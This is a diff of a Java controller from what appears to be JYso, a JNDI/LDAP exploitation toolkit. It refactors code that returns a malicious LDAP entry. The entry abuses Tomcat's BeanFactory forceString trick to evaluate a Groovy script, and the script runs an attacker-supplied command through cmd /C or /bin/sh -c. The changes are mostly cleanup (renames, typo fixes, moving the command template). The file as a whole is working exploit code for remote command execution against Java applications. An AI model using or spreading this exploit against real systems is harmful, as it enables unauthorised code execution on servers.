@@ -1,9 +1,8 @@
 package com.qi4l.JYso.controllers;
 
-import com.qi4l.JYso.enumtypes.PayloadType;
 import com.qi4l.JYso.exceptions.IncorrectParamsException;
 import com.qi4l.JYso.exceptions.UnSupportedPayloadTypeException;
-import com.qi4l.JYso.gadgets.utils.Util;
+import com.qi4l.JYso.gadgets.utils.Utils;
 import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
 import com.unboundid.ldap.sdk.Entry;
 import com.unboundid.ldap.sdk.LDAPResult;
@@ -12,8 +11,6 @@ import org.apache.naming.ResourceRef;
 import org.fusesource.jansi.Ansi;
 
 import javax.naming.StringRefAddr;
-
-import static org.fusesource.jansi.Ansi.ansi;
 
 /*
  * Requires:
@@ -29,13 +26,7 @@ import static org.fusesource.jansi.Ansi.ansi;
 
 @LdapMapping(uri = {"/groovy"})
 public class GroovyController implements LdapController {
-    private PayloadType type;
-    private String[]    params;
-    private String      template = " if (System.properties['os.name'].toLowerCase().contains('windows')) {\n" +
-            "       ['cmd','/C', '${cmd}'].execute();\n" +
-            "   } else {\n" +
-            "       ['/bin/sh','-c', '${cmd}'].execute();\n" +
-            "   }";
+    private String[] params;
 
     @Override
     public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
@@ -45,9 +36,14 @@ public class GroovyController implements LdapController {
         //prepare payload that exploits unsafe reflection in org.apache.naming.factory.BeanFactory
         ResourceRef ref = new ResourceRef("groovy.lang.GroovyShell", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
         ref.add(new StringRefAddr("forceString", "x=evaluate"));
+        String template = " if (System.properties['os.name'].toLowerCase().contains('windows')) {\n" +
+                "       ['cmd','/C', '${cmd}'].execute();\n" +
+                "   } else {\n" +
+                "       ['/bin/sh','-c', '${cmd}'].execute();\n" +
+                "   }";
         ref.add(new StringRefAddr("x", template.replace("${cmd}", params[0]).replace("${cmd}", params[0])));
 
-        e.addAttribute("javaSerializedData", Util.serialize(ref));
+        e.addAttribute("javaSerializedData", Utils.serialize(ref));
 
         result.sendSearchEntry(e);
         result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
@@ -55,22 +51,16 @@ public class GroovyController implements LdapController {
 
     @Override
     public void process(String base) throws UnSupportedPayloadTypeException, IncorrectParamsException {
-        System.out.println("- JNDI LDAP Local Refenrence Links + Groovy");
+        System.out.println("- JNDI LDAP Local Reference Links + Groovy");
         try {
-            int firstIndex  = base.indexOf("/");
+            int firstIndex = base.indexOf("/");
             int secondIndex = base.indexOf("/", firstIndex + 1);
             if (secondIndex < 0) secondIndex = base.length();
 
             String payloadType = base.substring(firstIndex + 1, secondIndex);
-            System.out.println(Ansi.ansi().fgBrightMagenta().a("  Paylaod: " + payloadType).reset());
-            if (payloadType.equalsIgnoreCase("command")) {
-                type = PayloadType.valueOf("command");
-                //System.out.println(ansi().render("@|green [+]|@ @|MAGENTA Paylaod >> |@" + type));
-            } else {
-                throw new UnSupportedPayloadTypeException("UnSupportedPayloadType >> " + payloadType);
-            }
+            System.out.println(Ansi.ansi().fgBrightMagenta().a("  Payload: " + payloadType).reset());
 
-            String cmd = Util.getCmdFromBase(base);
+            String cmd = Utils.getCmdFromBase(base);
             System.out.println(Ansi.ansi().fgBrightRed().a("  Command: " + cmd).reset());
             params = new String[]{cmd};
         } catch (Exception e) {
